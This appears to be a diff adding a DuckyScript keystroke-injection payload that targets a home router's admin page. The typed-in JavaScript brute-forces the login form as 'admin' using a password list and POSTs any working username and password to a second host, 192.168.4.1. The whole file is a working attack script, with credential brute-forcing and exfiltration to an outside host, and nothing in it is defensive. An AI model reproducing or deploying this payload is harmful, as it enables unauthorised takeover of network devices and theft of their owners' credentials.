@@ -1,0 +1,86 @@
+DELAY 1000
+STRING http://192.168.1.254
+ENTER
+DELAY 2000
+
+REM Open the script editor or upload area
+STRING document.getElementById('uploadScriptButton').click();  
+ENTER
+DELAY 2000
+
+REM Inject the script directly
+STRING var script = `
+ENTER
+STRING var username = 'admin';
+ENTER
+STRING 
+ENTER
+STRING function readPasswords() {
+ENTER
+STRING   var xhr = new XMLHttpRequest();
+ENTER
+STRING   xhr.open('GET', 'http://192.168.1.254/passwords.txt', false);
+ENTER
+STRING   xhr.send();
+ENTER
+STRING   return xhr.status == 200 ? xhr.responseText.split('\\n') : [];
+ENTER
+STRING }
+ENTER
+STRING 
+ENTER
+STRING async function bruteForce() {
+ENTER
+STRING   var passwords = readPasswords();
+ENTER
+STRING   for (var i = 0; i < passwords.length; i++) {
+ENTER
+STRING     var password = passwords[i].trim();
+ENTER
+STRING     document.getElementById('Frm_Username').value = username;
+ENTER
+STRING     document.getElementById('Frm_Password').value = password;
+ENTER
+STRING     document.getElementById('LoginId').click();
+ENTER
+STRING     await new Promise(resolve => setTimeout(resolve, 2000));
+ENTER
+STRING     if (document.body.innerHTML.includes('logout')) {
+ENTER
+STRING       sendCredentials(username, password);
+ENTER
+STRING       break;
+ENTER
+STRING     }
+ENTER
+STRING   }
+ENTER
+STRING }
+ENTER
+STRING 
+ENTER
+STRING function sendCredentials(username, password) {
+ENTER
+STRING   var xhr = new XMLHttpRequest();
+ENTER
+STRING   xhr.open('POST', 'http://192.168.4.1/', true);
+ENTER
+STRING   xhr.setRequestHeader('Content-Type', 'application/json');
+ENTER
+STRING   xhr.send(JSON.stringify({username: username, password: password}));
+ENTER
+STRING }
+ENTER
+STRING 
+ENTER
+STRING bruteForce();
+ENTER
+STRING `;
+ENTER
+STRING var scriptElement = document.createElement('script');
+ENTER
+STRING scriptElement.textContent = script;
+ENTER
+STRING document.head.appendChild(scriptElement);
+ENTER
+DELAY 5000
